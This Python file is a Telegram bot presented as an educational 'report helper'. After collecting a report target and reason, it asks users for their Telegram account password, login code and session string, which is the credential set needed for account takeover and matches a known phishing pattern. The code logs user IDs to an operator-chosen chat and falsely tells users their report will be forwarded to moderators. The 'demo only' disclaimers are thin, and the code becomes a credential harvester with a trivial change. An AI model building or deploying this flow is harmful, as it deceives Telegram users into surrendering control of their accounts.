#!/usr/bin/env python3
"""Telegram "report helper" bot (educational demo).

Run instructions
----------------
1) Install dependencies: ``python -m pip install -r requirements.txt``.
2) Export environment variables (or edit ``config.py``):
   - ``BOT_TOKEN``: Telegram bot token from @BotFather.
   - ``LOG_CHAT_ID``: Chat ID that should receive audit logs.
   - ``ADMIN_USER_IDS`` (optional): Comma-separated user IDs allowed to use /admin.
3) Start the bot: ``python main.py``.

The bot is intentionally educational. It simulates sensitive prompts (passwords,
login codes, session strings) and reporting flows. Remind users not to share
real secrets and to report only genuine abuse.
"""
from __future__ import annotations

import asyncio
import logging
from datetime import datetime, timezone
from typing import Dict

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import (
    AIORateLimiter,
    Application,
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

import config

# Conversation states
SELECT_TYPE, ASK_TARGET, ASK_REASON, ASK_EVIDENCE, ASK_PASSWORD, ASK_CODE, ASK_SESSION = range(7)


def build_logger() -> None:
    """Configure application logging to stdout."""

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )


def ensure_token() -> str:
    if not config.BOT_TOKEN:
        raise RuntimeError("BOT_TOKEN is required. Set it in the environment or config.py")
    return config.BOT_TOKEN


def main_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("Report a user", callback_data="type:user")],
            [InlineKeyboardButton("Report a group", callback_data="type:group")],
            [InlineKeyboardButton("Report a channel", callback_data="type:channel")],
            [InlineKeyboardButton("Report a story", callback_data="type:story")],
        ]
    )


def admin_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("View safety notice", callback_data="admin:notice")]]
    )


def send_log(context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
    """Send a fire-and-forget log message to the configured log chat."""

    if not config.LOG_CHAT_ID:
        logging.info("Skipping log send; LOG_CHAT_ID not configured: %s", text)
        return
    asyncio.create_task(
        context.bot.send_message(chat_id=config.LOG_CHAT_ID, text=text, disable_notification=True)
    )


def is_valid_link(text: str) -> bool:
    text = text.strip()
    return text.startswith("https://t.me/") or text.startswith("t.me/") or text.startswith("@")


def is_valid_code(text: str) -> bool:
    return text.isdigit() and 4 <= len(text) <= 8


def friendly_error(message: str) -> str:
    return f"⚠️ {message}\nChoose an option below or try again."


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Welcome users and guide them to the report helper."""

    greeting = (
        "👋 Hi! I'm an educational helper that demonstrates Telegram reporting flows.\n"
        "• I can ask for passwords, login codes, and session strings (demo only).\n"
        "• I can prepare a report on behalf of any user.\n"
        "Please report only genuine abuse and avoid sharing real secrets."
    )
    await update.effective_message.reply_text(
        greeting, reply_markup=main_menu_keyboard(), parse_mode=ParseMode.MARKDOWN
    )
    await update.effective_message.reply_text(
        "Tap a report type to begin or use /help for instructions."
    )
    return ConversationHandler.WAITING


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "ℹ️ *Report helper guide*\n"
        "1) Pick what you want to report (user, group, channel, story).\n"
        "2) Share the profile/invite link.\n"
        "3) Tell me why you're reporting and provide evidence links.\n"
        "4) I'll ask for password, login code, and session string (educational).\n"
        "5) I send a summary back to you and log the attempt.\n\n"
        "Use /report_help to start or /cancel to exit."
    )
    await update.effective_message.reply_text(message, parse_mode=ParseMode.MARKDOWN)


async def start_report(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Entry point for the report conversation."""

    await update.effective_message.reply_text(
        "What would you like to report? Choose an option.", reply_markup=main_menu_keyboard()
    )
    context.user_data.clear()
    return SELECT_TYPE


async def handle_report_type(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    _, report_type = query.data.split(":", maxsplit=1)
    context.user_data["report_type"] = report_type

    timestamp = datetime.now(timezone.utc).isoformat()
    user = update.effective_user
    username = f"@{user.username}" if user and user.username else "(no username)"
    send_log(
        context,
        f"New report flow: {report_type} | user_id={user.id if user else 'unknown'} | "
        f"username={username} | ts={timestamp}",
    )

    await query.edit_message_text(
        (
            f"Reporting a {report_type}.\n"
            "Send the profile or invite link (https://t.me/... or @username).\n"
            "If you send something else, I'll remind you and show the options again."
        ),
        reply_markup=None,
    )
    return ASK_TARGET


async def ask_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    link = (update.message.text or "").strip()
    if not is_valid_link(link):
        await update.effective_message.reply_text(
            friendly_error("Invalid link. Use https://t.me/... or @username."),
            reply_markup=main_menu_keyboard(),
        )
        return SELECT_TYPE

    context.user_data["target_link"] = link
    await update.effective_message.reply_text(
        "Got it. Briefly describe the abuse you're reporting (1-2 sentences)."
    )
    return ASK_REASON


async def ask_reason(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    reason = (update.message.text or "").strip()
    if len(reason) < 4:
        await update.effective_message.reply_text(
            friendly_error("That reason is too short. Please add a bit more detail."),
        )
        return ASK_REASON

    context.user_data["reason"] = reason
    await update.effective_message.reply_text(
        "Share a message link or evidence URL (https://...). Type 'skip' to continue."
    )
    return ASK_EVIDENCE


async def ask_evidence(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    evidence = (update.message.text or "").strip()
    if evidence.lower() != "skip" and evidence and not evidence.startswith("http"):
        await update.effective_message.reply_text(
            friendly_error("Evidence must be a URL (https://...)."),
        )
        return ASK_EVIDENCE

    context.user_data["evidence"] = None if evidence.lower() == "skip" else evidence
    await update.effective_message.reply_text(
        (
            "For this demo I need your *Telegram account password* (do not share a real one).\n"
            "After that I'll ask for your login code and session string."
        ),
        parse_mode=ParseMode.MARKDOWN,
    )
    return ASK_PASSWORD


async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    password = (update.message.text or "").strip()
    if not password:
        await update.effective_message.reply_text(friendly_error("Please provide some password text."))
        return ASK_PASSWORD

    context.user_data["password"] = password
    await update.effective_message.reply_text(
        "Next, share the Telegram login code you received (numbers only)."
    )
    return ASK_CODE


async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    code = (update.message.text or "").strip()
    if not is_valid_code(code):
        await update.effective_message.reply_text(
            friendly_error("Login code should be 4-8 digits. Please re-enter."),
        )
        return ASK_CODE

    context.user_data["code"] = code
    await update.effective_message.reply_text(
        "Finally, share your session string (any text will do for this demo)."
    )
    return ASK_SESSION


async def ask_session(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    session_text = (update.message.text or "").strip()
    if not session_text:
        await update.effective_message.reply_text(
            friendly_error("Session string cannot be empty. Please provide some text."),
        )
        return ASK_SESSION

    context.user_data["session"] = session_text
    await send_summary(update, context)
    return ConversationHandler.END


async def send_summary(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    data: Dict[str, str] = context.user_data
    summary_lines = [
        "✅ Report assembled (educational only).",
        f"Type: {data.get('report_type', 'n/a')}",
        f"Target: {data.get('target_link', 'n/a')}",
        f"Reason: {data.get('reason', 'n/a')}",
        f"Evidence: {data.get('evidence') or 'not provided'}",
        "Security prompts were answered (password, login code, session string).",
        "I'll forward this to the moderators."
    ]
    summary_text = "\n".join(summary_lines)
    await update.effective_message.reply_text(summary_text)

    # Send a log with sensitive fields redacted.
    send_log(
        context,
        (
            "Report summary (redacted): "
            f"type={data.get('report_type')} | target={data.get('target_link')} | "
            f"reason={data.get('reason')} | evidence={data.get('evidence') or 'none'}"
        ),
    )


async def admin_notice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.effective_user or update.effective_user.id not in config.ADMIN_USER_IDS:
        await update.effective_message.reply_text("Only admins can use this command.")
        return

    await update.effective_message.reply_text(
        "Admin shortcuts available. Use buttons for quick actions.", reply_markup=admin_keyboard()
    )


async def handle_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    if query.data == "admin:notice":
        await query.edit_message_text(
            (
                "Educational reminder: this bot demonstrates collecting passwords, "
                "login codes, and session strings. Never share real secrets outside "
                "official Telegram apps."
            )
        )


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.effective_message.reply_text(
        "Conversation canceled. Use /report_help to start over.", reply_markup=main_menu_keyboard()
    )
    return ConversationHandler.END


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logging.exception("Update %s caused error", update, exc_info=context.error)
    if isinstance(update, Update) and update.effective_message:
        await update.effective_message.reply_text("Something went wrong. Please try again later.")


def build_app() -> Application:
    application = (
        ApplicationBuilder()
        .token(ensure_token())
        .rate_limiter(AIORateLimiter())
        .concurrent_updates(True)
        .build()
    )

    report_conversation = ConversationHandler(
        entry_points=[CommandHandler("report_help", start_report)],
        states={
            SELECT_TYPE: [CallbackQueryHandler(handle_report_type, pattern=r"^type:")],
            ASK_TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_target)],
            ASK_REASON: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_reason)],
            ASK_EVIDENCE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_evidence)],
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)],
            ASK_SESSION: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_session)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True,
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("admin", admin_notice))
    application.add_handler(report_conversation)
    application.add_handler(CallbackQueryHandler(handle_admin_callback, pattern=r"^admin:"))

    application.add_error_handler(error_handler)
    return application


async def main() -> None:
    build_logger()
    app = build_app()
    await app.initialize()
    await app.start()
    logging.info("Bot started and polling.")
    await app.updater.start_polling()
    await app.updater.idle()
    await app.stop()
    await app.shutdown()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("Bot stopped by user.")
